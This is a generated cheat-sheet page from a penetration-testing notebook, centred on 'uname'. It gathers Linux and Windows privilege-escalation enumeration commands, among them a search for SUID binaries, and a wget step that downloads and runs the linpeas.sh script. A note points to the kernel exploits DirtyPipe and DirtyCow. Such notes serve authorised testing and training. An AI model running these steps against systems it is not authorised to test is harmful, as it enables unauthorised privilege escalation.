---
title: "uname"
sidebarTitle: "uname"
description: "Commands and examples collected from your uname notes."
keywords: ["uname"]
boost: 10
hideFooterPagination: true
---

{/* Generated from Commands/uname.md. Edit the Markdown source, then run scripts/sync_site.py. */}

[Search this tool’s saved examples](/commands/notebook?tool=uname) · [All tools](/index)

## 1. Download the binaries

**Notebook example**

```bash
uname -m
```

Saved as written; may include lab values or terminal output.

[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)

## Notebook recipes

3 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.

<AccordionGroup>

<Accordion title="First look at privilege escalation">

### First look at privilege escalation

**Getting Started with Penetration Testing**

```bash
# Linux
sudo -l                       # what can I run as root?
id; whoami
find / -perm -4000 2>/dev/null   # SUID binaries
uname -a                      # kernel version (kernel exploits)

# Windows
whoami /priv                  # dangerous privileges?
systeminfo                    # patch level / OS
```

</Accordion>

<Accordion title="Quick-start command cheat (run first, always)">

### Quick-start command cheat (run first, always)

**Privilege Escalation: Choose a Checklist**

```bash
# 1. Automated
wget "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/linpeas.out

# 2. Manual "big 6"
id; sudo -l; find / -perm -4000 -type f 2>/dev/null; getcap -r / 2>/dev/null; cat /etc/crontab; uname -a
```

</Accordion>

<Accordion title="Linux">

### Linux

**Privilege Escalation: Choose a Checklist**

Context from the notebook: uname -a  → kernel exploit (DirtyPipe, DirtyCow) — last resort, only if above fails

```text
uname -a
```

</Accordion>

</AccordionGroup>
